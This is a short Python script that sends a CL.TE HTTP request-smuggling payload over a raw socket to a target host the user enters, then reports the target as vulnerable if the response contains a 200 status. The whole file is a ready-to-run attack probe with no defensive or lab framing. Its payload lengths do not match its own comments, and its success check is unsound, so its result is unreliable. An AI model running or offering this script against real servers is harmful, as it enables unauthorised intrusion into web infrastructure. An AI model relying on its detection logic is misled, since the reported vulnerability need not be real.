






import socket

def send_smuggle_request(target_host, target_port):
    # Craft a malicious request with conflicting headers
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Content-Length: 6\r\n"          # Front-end uses this
        "Transfer-Encoding: chunked\r\n"  # Back-end uses this
        "\r\n"
        "0\r\n\r\n"                      # End of chunked request (back-end thinks it's done)
        "GET /smuggled HTTP/1.1\r\n"     # Smuggled request (processed by back-end)
        "Host: {host}\r\n\r\n"
    ).format(host=target_host)

    # Send raw HTTP request
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_host, target_port))
    sock.sendall(payload.encode())

    # Check response (may require multiple reads)
    response = sock.recv(4096).decode()
    print("Response:", response)
    sock.close()

    # Verify if smuggled request was processed
    if "HTTP/1.1 200" in response:
        print("[+] Vulnerable to CL.TE smuggling!")
    else:
        print("[-] Target may not be vulnerable")

# Example usage
if __name__ == "__main__":
    TARGET_HOST = input("Enter target host: ")
    TARGET_PORT = 80
    send_smuggle_request(TARGET_HOST, TARGET_PORT)